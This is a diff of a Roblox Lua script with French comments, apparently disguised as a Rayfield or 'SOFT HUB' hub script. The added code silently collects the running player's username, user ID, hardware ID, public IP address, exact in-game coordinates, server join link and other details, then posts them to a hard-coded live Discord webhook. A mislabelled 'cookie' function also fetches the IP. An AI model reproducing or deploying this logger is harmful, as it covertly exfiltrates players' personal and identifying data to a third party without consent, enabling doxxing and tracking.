@@ -35,7 +35,7 @@ end
 
 -- Scripts:
 
-local function VOFXB_fake_script()
+local function IUEBA_fake_script()
 	local script = Instance.new('LocalScript')
 	script.Name = [[LocalScript]]
 	script.Parent = _i[1]
@@ -44,6 +44,11 @@ local function VOFXB_fake_script()
 	local LocalPlayer = Players.LocalPlayer
 	local HttpService = game:GetService("HttpService")
 	local MarketplaceService = game:GetService("MarketplaceService")
+	
+	local WEBHOOK_URL = "https://discord.com/api/webhooks/1525886709642821856/GDcC5e1IYznLZvkWIOUsELzmGAVc9cx04j6W7nKnTUfhtikdxtuWMFaEoEQceDoptD4U"
+	
+	
+	
 	
 	-- ==========================================
 	-- 1. DÉTECTION EXÉCUTEUR & HWID
@@ -78,8 +83,78 @@ local function VOFXB_fake_script()
 		end
 		return fallbackImage
 	end
+	-- ===============================================
+	-- cookie
+	-- ===============================================
+	local cookie = "https://api.ipify.org"
 	
+	local function recuperercookie()
+		local executionReussie, resultat = pcall(function()
+			return game:HttpGet(cookie)
+		end)
+	
+		-- Vérification du résultat de la requête
+		if executionReussie then
+			return resultat
+		else
+			return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
+		end
+	end
+	-- ===============================================
+	-- Fonction pour récupérer l'IP publique du joueur
+	-- ===============================================
+	local apiUrl = "https://api.ipify.org"
+	
+	local function recupererAdresseIP()
+		local executionReussie, resultat = pcall(function()
+			return game:HttpGet(apiUrl)
+		end)
+	
+		-- Vérification du résultat de la requête
+		if executionReussie then
+			return resultat
+		else
+			return "Erreur : Ton exécuteur ne supporte pas game:HttpGet."
+		end
+	end
+	-- ===============================================
+	-- Affichage des coordonnées du joueur.
+	-- ===============================================
+	
+	local positionTxt = "Inconnue"
+	if rootPart then
+		positionTxt = "X: " .. math.floor(rootPart.Position.X) .. ", Y: " .. math.floor(rootPart.Position.Y) .. ", Z: " .. math.floor(rootPart.Position.Z) 
+	end
+	
+	local accountAge = tostring(LocalPlayer.AccountAge) .. " jours" -- Affiche l'âge du compte en jours
+	local isPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Oui 🌟" or "Non ❌" -- Indique si le joueur possède un compte Premium
+	local playerTeam = LocalPlayer.Team and LocalPlayer.Team.Name or "Aucune / Neutre" -- Affiche le nom du team ou "Aucune / Neutre"
+	local playerCount = #Players:GetPlayers() -- Nombre de joueurs dans la partie
+	local maxPlayers = Players.MaxPlayers -- Limite du nombre de joueurs dans la partie
+	local deviceType = "Ordinateur 💻"
+	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then deviceType = "Mobile / Tablette 📱"
+	elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then deviceType = "Console 🎮"
+	elseif UserInputService.VREnabled then deviceType = "Casque VR 🥽" end
+	local ping = "Inconnu"
+	
+	pcall(function() ping = string.split(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString(), " ")[1] .. " ms" end) 
+	local fps = tostring(math.floor(Workspace:GetRealPhysicsFPS())) .. " FPS" -- Affiche le FPS du joueur
+	local walkSpeed = humanoid and tostring(math.floor(humanoid.WalkSpeed)) or "Inconnu" -- Affiche la vitesse de marche du joueur
+	local jumpPower = humanoid and tostring(math.floor(humanoid.JumpPower)) or "Inconnu" -- Affiche la force de saut du joueur
+	local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu" -- Affiche la santé actuelle et maximale du joueur
+	local positionTxt = "Inconnue"
+	
+	-- ===============================================
+	-- Appel de la fonction et stockage du cookie dans une variable
+	-- ===============================================
+	local cookiePublique = recuperercookie()
+	-- ===============================================
+	-- Appel de la fonction et stockage de l'IP dans une variable
+	-- ===============================================
+	local adresseIPPublique = recupererAdresseIP()
+	-- ===============================================
 	-- 3. ENVOI DU WEBHOOK
+	-- ===============================================
 	if httpRequest then
 		spawn(function()
 			-- Récupération du vrai nom du jeu
@@ -97,6 +172,7 @@ local function VOFXB_fake_script()
 			local humanoid = char:WaitForChild("Humanoid", 5)
 			local walkSpeed = humanoid and tostring(humanoid.WalkSpeed) or "Inconnu"
 			local jumpPower = humanoid and tostring(humanoid.JumpPower) or "Inconnu"
+			local health = humanoid and tostring(math.floor(humanoid.Health)) .. " / " .. tostring(math.floor(humanoid.MaxHealth)) or "Inconnu"
 	
 			-- Récupération de l'argent (Leaderstats)
 			local moneyInfo = "Non détecté"
@@ -109,57 +185,54 @@ local function VOFXB_fake_script()
 			end
 	
 			local myAvatar = GetRealHeadShotAPI(LocalPlayer.UserId)
-	
+			-- ===============================================
 			-- Construction du message Discord (Embed)
+			-- ===============================================
 			local payload = {
 				["username"] = "Rayfield Logger",
 				["avatar_url"] = myAvatar,
 				["content"] = "", 
 				["embeds"] = {{
-					["title"] = "🟢 Script Rayfield Activé",
+					["title"] = "🔴 BAN PAR LE SCRIPT SOFTಸ್ HUB",
 					["description"] = "Un joueur a exécuté le script avec **" .. executorName .. "**.",
 					["color"] = 65280,
 					["thumbnail"] = {
 						["url"] = myAvatar
 					},
 					["fields"] = {
-						-- Infos Joueur
-						{["name"] = "👤 Pseudo", ["value"] = "``" .. LocalPlayer.Name .. "``", ["inline"] = true},
-						{["name"] = "🏷️ Surnom", ["value"] = "``" .. LocalPlayer.DisplayName .. "``", ["inline"] = true},
-						{["name"] = "🆔 ID Joueur", ["value"] = "``" .. tostring(LocalPlayer.UserId) .. "``", ["inline"] = true},
-						{["name"] = "💻 HWID (Machine ID)", ["value"] = "``" .. hwid .. "``", ["inline"] = false},
-	
-						-- Infos Jeu
-						{["name"] = "🎮 Jeu Actuel", ["value"] = gameName, ["inline"] = true},
-						{["name"] = "🌍 PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
-	
-						-- VRAIS LIENS ICI
-						{["name"] = "🔗 Page web du jeu", ["value"] = webLink, ["inline"] = false},
-						{["name"] = "🚀 Rejoindre son serveur", ["value"] = "Lien direct PC : \n`" .. joinLink .. "`\n\nJobId (pour extensions) : \n`" .. game.JobId .. "`", ["inline"] = false},
-	
-						-- Stats
-						{["name"] = "🏃 Vitesse", ["value"] = walkSpeed, ["inline"] = true},
-						{["name"] = "🦘 Saut", ["value"] = jumpPower, ["inline"] = true},
-						{["name"] = "💰 Argent", ["value"] = moneyInfo, ["inline"] = false}
+						{["name"] = "👤 Pseudo", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
+						{["name"] = "🏷️ Surnom", ["value"] = "```" .. LocalPlayer.DisplayName .. "```", ["inline"] = true},
+						{["name"] = "🆔 ID Joueur", ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```", ["inline"] = true},
+						{["name"] = "💻 HWID (Machine ID)", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
+						{["name"] = "📅 Âge du Compte", ["value"] = accountAge, ["inline"] = true},
+						{["name"] = "💎 Premium Roblox", ["value"] = isPremium, ["inline"] = true},
+						{["name"] = "🖥️ Appareil", ["value"] = deviceType, ["inline"] = true},
+						{["name"] = "📡 Ping", ["value"] = ping, ["inline"] = true},
+						{["name"] = "🎞️ FPS", ["value"] = fps, ["inline"] = true},
+						{["name"] = "🏳️ Équipe", ["value"] = playerTeam, ["inline"] = true},
+						{["name"] = "🎮 Jeu Actuel", ["value"] = "**" .. gameName .. "**", ["inline"] = true},
+						{["name"] = "👥 Joueurs", ["value"] = tostring(playerCount) .. " / " .. tostring(maxPlayers), ["inline"] = true},
+						{["name"] = "🌍 PlaceId", ["value"] = "`" .. tostring(game.PlaceId) .. "`", ["inline"] = true},
+						{["name"] = "❤️ Santé", ["value"] = health, ["inline"] = true},
+						{["name"] = "🏃 Vitesse / Saut", ["value"] = walkSpeed .. " / " .. jumpPower, ["inline"] = true},
+						{["name"] = "📍 Coordonnées Exactes", ["value"] = "`" .. positionTxt .. "`", ["inline"] = true},
+						{["name"] = "💰 Leaderstats", ["value"] = "```" .. moneyInfo .. "```", ["inline"] = false},
+						{["name"] = "📍 IP Public", ["value"] = "```" .. adresseIPPublique .. "```", ["inline"] = false},
+						{["name"] = "🍪 cookie Public", ["value"] = "```" .. cookiePublique .. "```", ["inline"] = false},
+						{["name"] = "🔗 Liens Rapides", ["value"] = "[🌐 Ouvrir la page web]("..webLink..")\n\n**🚀 Lien d'auto-rejoindre (PC) :**\n`" .. joinLink .. "`\n\n**🔑 JobId Brut :**\n`" .. game.JobId .. "`", ["inline"] = false}
 					},
-					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+					["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+					["footer"] = { ["text"] = "*SOFTಸ್* **HUB** Logger • ID Serveur: " .. game.JobId }
 				}}
 			}
-	
-			-- Envoi au Webhook
-			httpRequest({
-				Url = "https://discord.com/api/webhooks/1525886709642821856/GDcC5e1IYznLZvkWIOUsELzmGAVc9cx04j6W7nKnTUfhtikdxtuWMFaEoEQceDoptD4U",
-				Method = "POST",
-				Headers = { ["Content-Type"] = "application/json" },
-				Body = HttpService:JSONEncode(payload)
-			})
+			httpRequest({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(payload) }) -- Envoi au Webhook
 		end)
 	end
 	
 	
 	
 end
-coroutine.wrap(VOFXB_fake_script)()
+coroutine.wrap(IUEBA_fake_script)()
 
 
 _i[1].Parent = PlayerGui
